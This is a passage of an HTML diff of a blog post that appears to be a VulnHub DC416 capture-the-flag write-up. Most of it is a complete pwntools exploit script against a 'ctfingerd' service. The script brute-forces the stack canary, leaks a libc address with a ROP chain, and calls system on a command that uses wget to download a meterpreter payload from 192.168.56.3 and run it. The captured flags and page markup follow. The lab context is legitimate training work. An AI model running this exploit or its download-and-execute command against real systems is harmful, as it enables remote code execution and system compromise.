+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>#!/usr/bin/env python2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>from pwn import *
+</span></span><span style="display:flex;"><span>import re
+</span></span><span style="display:flex;"><span>import sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context(bits=64,
+</span></span><span style="display:flex;"><span>        os=&#34;linux&#34;,
+</span></span><span style="display:flex;"><span>        aslr=False,
+</span></span><span style="display:flex;"><span>        #log_level=&#34;DEBUG&#34;,
+</span></span><span style="display:flex;"><span>        terminal=[&#34;tmux&#34;, &#34;splitw&#34;, &#34;-l&#34;, &#34;45&#34;])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>if len(sys.argv) &gt; 1:
+</span></span><span style="display:flex;"><span>    local = True
+</span></span><span style="display:flex;"><span>else:
+</span></span><span style="display:flex;"><span>    local = False
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>if local:
+</span></span><span style="display:flex;"><span>    p_main = process(&#34;./ctfingerd&#34;)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>def encode_payload(p):
+</span></span><span style="display:flex;"><span>    return &#34;&#34;.join(&#34;\\x{:02x}&#34;.format(ord(c)) for c in p)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>def send_content(content):
+</span></span><span style="display:flex;"><span>    t = 1 if local else 2
+</span></span><span style="display:flex;"><span>    with context.quiet:
+</span></span><span style="display:flex;"><span>        p = None
+</span></span><span style="display:flex;"><span>        try:
+</span></span><span style="display:flex;"><span>            p = remote(&#34;127.0.0.1&#34;, 7979)
+</span></span><span style="display:flex;"><span>            temp = p.recvuntil(&#34;User to query: &#34;, timeout=t)
+</span></span><span style="display:flex;"><span>            m = re.search(r&#34;Socket fd: ([0-9]+)&#34;, temp)
+</span></span><span style="display:flex;"><span>            if m:
+</span></span><span style="display:flex;"><span>                log.info(&#34;FD: {}&#34;.format(m.group(1)))
+</span></span><span style="display:flex;"><span>                fd = int(m.group(1))
+</span></span><span style="display:flex;"><span>            p.send(content)
+</span></span><span style="display:flex;"><span>            p.recvuntil(&#34;Checking...\n&#34;, timeout=t)
+</span></span><span style="display:flex;"><span>            content = p.recv(timeout=t)
+</span></span><span style="display:flex;"><span>            content = content.strip()
+</span></span><span style="display:flex;"><span>            return content
+</span></span><span style="display:flex;"><span>        finally:
+</span></span><span style="display:flex;"><span>            if p:
+</span></span><span style="display:flex;"><span>                p.close()
+</span></span><span style="display:flex;"><span>            if local:
+</span></span><span style="display:flex;"><span>                p_main.recv()
+</span></span><span style="display:flex;"><span>    return None
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>def brute_next_canary_value(stack):
+</span></span><span style="display:flex;"><span>    for x in xrange(0, 256):
+</span></span><span style="display:flex;"><span>        payload = stack + chr(x)
+</span></span><span style="display:flex;"><span>        retval = send_content(payload)
+</span></span><span style="display:flex;"><span>        if retval is None:
+</span></span><span style="display:flex;"><span>            log.error(&#34;something has gone wrong&#34;)
+</span></span><span style="display:flex;"><span>        if &#34;---&#34; in retval:
+</span></span><span style="display:flex;"><span>            return x
+</span></span><span style="display:flex;"><span>    log.error(&#34;Can not find next canary&#34;)
+</span></span><span style="display:flex;"><span>    return None
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>def leak_address(address):
+</span></span><span style="display:flex;"><span>    with context.quiet:
+</span></span><span style="display:flex;"><span>        p = remote(&#34;127.0.0.1&#34;, 7979)
+</span></span><span style="display:flex;"><span>    temp = p.recvuntil(&#34;User to query: &#34;)
+</span></span><span style="display:flex;"><span>    m = re.search(r&#34;Socket fd: ([0-9]+)&#34;, temp)
+</span></span><span style="display:flex;"><span>    fd = int(m.group(1))
+</span></span><span style="display:flex;"><span>    log.info(&#34;leak fd: {}&#34;.format(fd))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload  = &#34;&#34;
+</span></span><span style="display:flex;"><span>    payload += user
+</span></span><span style="display:flex;"><span>    payload += stack_canary
+</span></span><span style="display:flex;"><span>    payload += p64(dummy) # RBP
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    # write:
+</span></span><span style="display:flex;"><span>    #   rdi: fd
+</span></span><span style="display:flex;"><span>    #   rsi: buf
+</span></span><span style="display:flex;"><span>    #   rdx: count
+</span></span><span style="display:flex;"><span>    # rdx is 0x25 from previous calls
+</span></span><span style="display:flex;"><span>    payload += p64(pop_rsi_pop_r15_ret)
+</span></span><span style="display:flex;"><span>    payload += p64(address)
+</span></span><span style="display:flex;"><span>    payload += p64(dummy)
+</span></span><span style="display:flex;"><span>    payload += p64(pop_rdi_ret)
+</span></span><span style="display:flex;"><span>    payload += p64(fd)
+</span></span><span style="display:flex;"><span>    payload += p64(write_plt)
+</span></span><span style="display:flex;"><span>    payload += p64(dummy)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    log.info(&#34;Sending leak payload ...&#34;)
+</span></span><span style="display:flex;"><span>    p.send(payload)
+</span></span><span style="display:flex;"><span>    p.recvuntil(&#34;Checking...\n&#34;)
+</span></span><span style="display:flex;"><span>    c = p.recv()
+</span></span><span style="display:flex;"><span>    with context.quiet:
+</span></span><span style="display:flex;"><span>        p.close()
+</span></span><span style="display:flex;"><span>    # only take the last RDX bytes, the rest is the plan file or error message
+</span></span><span style="display:flex;"><span>    c = c[-37:]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    # trim to 8 bytes as we received more bytes
+</span></span><span style="display:flex;"><span>    leak = c[:8]
+</span></span><span style="display:flex;"><span>    leak = unpack(leak, &#34;all&#34;)
+</span></span><span style="display:flex;"><span>    return leak
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>stack_len = 1000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>user  = &#34;A&#34; * 20
+</span></span><span style="display:flex;"><span>user += &#34;\x0a&#34;
+</span></span><span style="display:flex;"><span>user += &#34;A&#34; * (stack_len - len(user))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>stack_canary = &#34;&#34;
+</span></span><span style="display:flex;"><span>for a in xrange(1, 9):
+</span></span><span style="display:flex;"><span>    ret = brute_next_canary_value(user + stack_canary)
+</span></span><span style="display:flex;"><span>    log.success(&#34;Found part {}/8 of stack canary: {:#02x}&#34;.format(a, ret))
+</span></span><span style="display:flex;"><span>    stack_canary += chr(ret)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log.success(&#34;Stack Canary is {}&#34;.format(encode_payload(stack_canary)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dummy = 0xdeadbeefdeadbeef
+</span></span><span style="display:flex;"><span>pop_rdi_ret = 0x401013 # pop rdi; ret
+</span></span><span style="display:flex;"><span>pop_rsi_pop_r15_ret = 0x0401011 # pop rsi ; pop r15 ; ret
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>with context.quiet:
+</span></span><span style="display:flex;"><span>    b = ELF(&#34;./ctfingerd&#34;)
+</span></span><span style="display:flex;"><span>read_got = b.got[&#34;read&#34;]
+</span></span><span style="display:flex;"><span>write_plt = b.plt[&#34;write&#34;]
+</span></span><span style="display:flex;"><span>log.info(&#34;read@got: {:#08x}&#34;.format(read_got))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>leak = leak_address(read_got)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log.info(&#34;leaked read address: {:#08x}&#34;.format(leak))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>if local:
+</span></span><span style="display:flex;"><span>    # local libc version 2.24
+</span></span><span style="display:flex;"><span>    offset_read = 0xdb5b0
+</span></span><span style="display:flex;"><span>    offset_system = 0x3f460
+</span></span><span style="display:flex;"><span>    # xor rax, rax ; ret
+</span></span><span style="display:flex;"><span>    offset_xor_rax_rax = 0x80615
+</span></span><span style="display:flex;"><span>    # syscall ; ret
+</span></span><span style="display:flex;"><span>    offset_syscall = 0xa85f5
+</span></span><span style="display:flex;"><span>    # pop rdx ; ret
+</span></span><span style="display:flex;"><span>    offset_pop_rdx = 0x1b92
+</span></span><span style="display:flex;"><span>else:
+</span></span><span style="display:flex;"><span>    # remote libc version 2.19
+</span></span><span style="display:flex;"><span>    offset_read = 0x0dbb90
+</span></span><span style="display:flex;"><span>    offset_system = 0x41490
+</span></span><span style="display:flex;"><span>    # xor rax, rax ; ret
+</span></span><span style="display:flex;"><span>    offset_xor_rax_rax = 0x81dd5
+</span></span><span style="display:flex;"><span>    # syscall ; ret
+</span></span><span style="display:flex;"><span>    offset_syscall = 0xbade5
+</span></span><span style="display:flex;"><span>    # pop rdx ; ret
+</span></span><span style="display:flex;"><span>    offset_pop_rdx = 0x1b8e
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc_base = leak - offset_read
+</span></span><span style="display:flex;"><span>log.info(&#34;libc base: {:#08x}&#34;.format(libc_base))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>addr_system = libc_base + offset_system
+</span></span><span style="display:flex;"><span>log.info(&#34;system: {:#08x}&#34;.format(addr_system))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>if local:
+</span></span><span style="display:flex;"><span>    gdb_cmd = []
+</span></span><span style="display:flex;"><span>    gdb_cmd.append(&#34;set follow-fork-mode child&#34;)
+</span></span><span style="display:flex;"><span>    #  gdb_cmd.append(&#34;b *{:#08x}&#34;.format(offset_syscall))
+</span></span><span style="display:flex;"><span>    #  gdb_cmd.append(&#34;b *{:#08x}&#34;.format(pop_rsi_pop_r15_ret))
+</span></span><span style="display:flex;"><span>    gdb_cmd.append(&#34;b *{:#08x}&#34;.format(pop_rdi_ret))
+</span></span><span style="display:flex;"><span>    #  gdb_cmd.append(&#34;b *{:#08x}&#34;.format(addr_system))
+</span></span><span style="display:flex;"><span>    gdb_cmd.append(&#34;c&#34;)
+</span></span><span style="display:flex;"><span>    gdb_cmd = &#34;\n&#34;.join(gdb_cmd)
+</span></span><span style="display:flex;"><span>    #  gdb.attach(p_main, gdb_cmd)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>with context.quiet:
+</span></span><span style="display:flex;"><span>    p = remote(&#34;127.0.0.1&#34;, 7979)
+</span></span><span style="display:flex;"><span>temp = p.recvuntil(&#34;User to query: &#34;)
+</span></span><span style="display:flex;"><span>m = re.search(r&#34;Socket fd: ([0-9]+)&#34;, temp)
+</span></span><span style="display:flex;"><span>fd = int(m.group(1))
+</span></span><span style="display:flex;"><span>log.info(&#34;fd: {}&#34;.format(fd))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>free_space = 0x6012c0 # .dynamic
+</span></span><span style="display:flex;"><span>command = &#34;/bin/sh -c \&#34;/usr/bin/rm -f /tmp/meterpreter; /usr/bin/wget -O /tmp/meterpreter http://192.168.56.3/meterpreter ; chmod +x /tmp/meterpreter; /tmp/meterpreter\&#34;\x00&#34;;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload  = &#34;&#34;
+</span></span><span style="display:flex;"><span>payload += user
+</span></span><span style="display:flex;"><span>payload += stack_canary
+</span></span><span style="display:flex;"><span>payload += p64(dummy)
+</span></span><span style="display:flex;"><span>payload += p64(pop_rdi_ret)
+</span></span><span style="display:flex;"><span>payload += p64(dummy)
+</span></span><span style="display:flex;"><span># read via libc
+</span></span><span style="display:flex;"><span># sys_read:
+</span></span><span style="display:flex;"><span>#   rax: 0
+</span></span><span style="display:flex;"><span>#   rdi: fd
+</span></span><span style="display:flex;"><span>#   rsi: *buf
+</span></span><span style="display:flex;"><span>#   rdx: count
+</span></span><span style="display:flex;"><span>payload += p64(libc_base + offset_xor_rax_rax)
+</span></span><span style="display:flex;"><span>payload += p64(pop_rdi_ret)
+</span></span><span style="display:flex;"><span>payload += p64(fd)
+</span></span><span style="display:flex;"><span>payload += p64(pop_rsi_pop_r15_ret)
+</span></span><span style="display:flex;"><span>payload += p64(free_space)
+</span></span><span style="display:flex;"><span>payload += p64(dummy)
+</span></span><span style="display:flex;"><span>payload += p64(libc_base + offset_pop_rdx)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload += p64(len(command))
+</span></span><span style="display:flex;"><span>payload += p64(libc_base + offset_syscall)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload += p64(pop_rdi_ret)
+</span></span><span style="display:flex;"><span>payload += p64(free_space)
+</span></span><span style="display:flex;"><span>payload += p64(addr_system)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p.send(payload)
+</span></span><span style="display:flex;"><span>p.recvuntil(&#34;Checking...\n&#34;)
+</span></span><span style="display:flex;"><span>sleep(1)
+</span></span><span style="display:flex;"><span>p.send(command)
+</span></span><span style="display:flex;"><span>p.recv()
+</span></span><span style="display:flex;"><span>with context.quiet:
+</span></span><span style="display:flex;"><span>    p.close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pause()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>if local:
+</span></span><span style="display:flex;"><span>    p_main.close()
+</span></span></code></pre></div><h2 id="charlie">charlie<a href="#charlie" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>Getting charlies flag was straightforward</p>
-<pre tabindex="0"><code>$ cd /home/charlie
-cd charlie
-$ cat flag.txt
-cat flag.txt
-FLAG{i_haz_sriracha_ice_cream}
-</code></pre><p>Finally all 5 flags after a lot of fun hours exploiting the binaries :)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ cd /home/charlie
+</span></span><span style="display:flex;"><span>cd charlie
+</span></span><span style="display:flex;"><span>$ cat flag.txt
+</span></span><span style="display:flex;"><span>cat flag.txt
+</span></span><span style="display:flex;"><span>FLAG{i_haz_sriracha_ice_cream}
+</span></span></code></pre></div><p>Finally all 5 flags after a lot of fun hours exploiting the binaries :)</p>
 <p>All 5 flags:</p>
-<pre tabindex="0"><code>FLAG{ARSE_REQUEST}
-FLAG{is_there_an_ivana_tinkle}
-FLAG{tr3each3ry_anD_cUnn1ng}
-FLAG{i_tot_i_saw_a_puddy_tat}
-FLAG{i_haz_sriracha_ice_cream}
-</code></pre>
-                    </div>
-                </section>
-            </div>
-            <div class="footer">
-    <div class="pure-menu pure-menu-horizontal pure-menu-open">
-        <ul>
-            <li>Copyright by Christian Mehlmauer</li>
-            <li>source code available on <a href="https://github.com/firefart/firefart.github.io">Github</a></li>
-        </ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>FLAG{ARSE_REQUEST}
+</span></span><span style="display:flex;"><span>FLAG{is_there_an_ivana_tinkle}
+</span></span><span style="display:flex;"><span>FLAG{tr3each3ry_anD_cUnn1ng}
+</span></span><span style="display:flex;"><span>FLAG{i_tot_i_saw_a_puddy_tat}
+</span></span><span style="display:flex;"><span>FLAG{i_haz_sriracha_ice_cream}
+</span></span></code></pre></div>
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://firefart.at/post/vulnhub_dc416_dick_dastardly/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Vulnhub - DC416: Dick Dastardly Writeup</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://firefart.at/post/vulnhub_dc416_basement/">
+                <span class="button__text">Vulnhub - DC416: Basement Writeup</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
     </div>
 </div>
-<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-<script type="text/javascript" src='https://firefart.at/js/firefart.js'></script>
 
-<script type="text/javascript">
-    var _paq = window._paq || [];
-     
-    _paq.push(["setCookieDomain", "*.firefart.at"]);
-    _paq.push(['trackPageView']);
-    _paq.push(['enableLinkTracking']);
-    (function () {
-        var u = "https://tracking.firefart.at/";
-        _paq.push(['setTrackerUrl', u + 'mat.php']);
-        _paq.push(['setSiteId', '1']);
-        var d = document,
-            g = d.createElement('script'),
-            s = d.getElementsByTagName('script')[0];
-        g.type = 'text/javascript';
-        g.async = true;
-        g.defer = true;
-        g.src = u + 'mat.js';
-        s.parentNode.insertBefore(g, s);
-    })();
-</script>
-<noscript>
-    <p><img src="https://tracking.firefart.at/mat.php?idsite=1&amp;rec=1" style="border:0;" alt="" /></p>
-</noscript>
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>Copyright by Christian Mehlmauer</span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
 
 
-        </div>
-    </div>
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+  
 </div>
+
 </body>
-
 </html>
